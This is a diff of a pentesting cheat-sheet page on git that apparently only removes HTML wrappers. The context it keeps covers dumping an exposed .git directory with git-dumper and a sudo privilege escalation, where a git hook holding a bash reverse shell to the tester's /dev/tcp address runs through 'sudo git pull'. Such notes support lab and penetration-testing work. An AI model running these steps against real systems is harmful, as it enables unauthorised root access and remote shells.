@@ -6,8 +6,6 @@ tags: ["git", "git-dumper", "sudo", "privesc"]
 
 ### Basic Commands
 
-<div>
-
 ```console
 # Show status
 git status
@@ -44,10 +42,6 @@ git diff <A_COMMIT_HASH> <B_COMMIT_HASH>
 git show <COMMIT_HASH>
 ```
 
-</div>
-
-<br>
-
 ---
 
 ### Git Tools
@@ -56,20 +50,14 @@ git show <COMMIT_HASH>
 {{< tab set1 tab2 >}}git-bundle{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 git-dumper <TARGET>/.git result/
 ```
-
-</div>
 
 <small>*Ref: [Download git-dumper](https://github.com/arthaud/git-dumper)*</small>
 
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
-
-<div>
 
 ```console
 # List all bundles
@@ -81,17 +69,11 @@ find . -type f -exec file {} \;
 git clone -b master @hashed/ab/cd/<HASH>.bundle
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
 
 ---
 
 ### SUDO
-
-<div>
 
 ```console
 # Copy target project
@@ -108,8 +90,4 @@ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/<LOCAL_IP>/<LOCAL_PORT> 0>&1' > ./pr
 sudo /usr/bin/git pull
 ```
 
-</div>
-
 <small>*Note: Make changes to the project to make the pull work*</small>
-
-<br>
